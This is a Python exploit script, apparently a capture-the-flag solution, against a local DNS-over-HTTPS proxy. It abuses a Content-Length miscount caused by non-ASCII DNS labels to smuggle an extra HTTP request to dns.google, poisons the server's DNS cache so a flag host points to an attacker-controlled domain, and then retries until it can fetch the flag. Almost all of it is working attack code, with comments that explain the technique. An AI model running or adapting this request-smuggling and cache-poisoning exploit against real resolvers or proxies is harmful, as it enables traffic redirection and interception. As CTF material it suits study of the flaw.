import requests
import re

HOST = "http://127.0.0.1:5000"
MY_DOMAIN = "my.server.com"

# DoH = DNS Over HTTPS
DOH_TEMPLATE = """POST /dns-query HTTP/1.1
Host: dns.google
Accept: application/dns-message
Content-Type: application/dns-message
Content-Length: %d

""".replace("\r\n", "\n").replace("\n", "\r\n")  # Make sure we always send \r\n
DNS_QUERY_FOOTER = b"\x00\x00\x01\x00\x01"


def build_dns_query_header(num_queries):
    return b"\x00\x00\x01\x00\x00%c\x00\x00\x00\x00\x00\x00" % num_queries


def build_dns_query_payload(host):
    if isinstance(host, bytes):
        host = host.split(b".")
    elif isinstance(host, str):
        host = host.encode().split(b".")
        
    query = b"".join(bytes([len(part)]) + part for part in host)
    query += DNS_QUERY_FOOTER
    return query    


def build_dns_query(hosts):
    return build_dns_query_header(len(hosts)) + b"".join(map(build_dns_query_payload, hosts))


def submit_doh_query(session, payload):
    headers = {
        "Content-Type": "application/dns-message", 
        "Accept": "application/dns-message",
        "Content-Length": str(len(payload)),
    }
    return session.post("%s/dns-query" % HOST, headers=headers, data=payload).content


def build_doh_request_for_injection(host):
    payload = build_dns_query([host])    
    data = (DOH_TEMPLATE % (len(payload))).encode()
    
    # Add the DNS query as the DoH request body but omit the footer
    # since one will be added anyway by the encapsulating DNS query
    data += payload[:-len(DNS_QUERY_FOOTER)]
    return data


def main():
    session = requests.session()
    index_page = session.get(HOST).text
    target_host = re.findall(r"\n(.+\.flag)", index_page)[0]
    print("Target domain to poison is: %s" % target_host)

    injected_doh_req = build_doh_request_for_injection(MY_DOMAIN)
    # In order to inject our extra DoH request we use non-ascii characters in the DNS elements.
    # Each such character will cause the server to wrongly shorten the Content-Length header by 1, giving us
    # one extra byte of HTTP payload to submit to the real DoH server.
    # The amount of extra bytes we need is the length of our HTTP request minus one because the
    # label length will be >128 so the length character will (also wrongly) be encoded as 2 bytes and give us
    # back this extra byte.
    ext_char = "\x80".encode()
    assert len(ext_char) == 2

    ext_bytes_needed = len(injected_doh_req) + len(DNS_QUERY_FOOTER) - 1

    # Partition these extension bytes into DNS elements smaller than the max allowed 192 bytes.
    max_label_len = 90  # maximum is 192 / 2
    ext_elements = [
        ext_char * min(max_label_len, ext_bytes_needed - i)
        for i in range(0, ext_bytes_needed, max_label_len)
    ]

    # The final DoH query includes two DNS labels to resolve:
    # 1) The extension bytes + the injected DoH request. This should actually submit two queries to the
    #    real DoH server: One completely malformed, and one for the domain we control.
    # 2) the target host. For this request the server hopefully receives the response for the previous query,
    #    tricking it to think that the target host points to our IP.
    query1 = ext_elements + [injected_doh_req]
    query2 = target_host

    # Send the malicious DoH query, that will poison the server's DNS cache to point the target host to our IP
    # It doesn't always work so retry until it succeeds
    while True:
        submit_doh_query(session, build_dns_query([query1, query2]))
        if not submit_doh_query(session, build_dns_query([target_host])).endswith(b"\x00\x01\x00\x01"):
            print("DNS poisoned successfully!")

            res = session.post("%s/send-flag" % HOST)
            print(res.text)

            break

        print("Retrying")


if __name__ == '__main__':
    main()
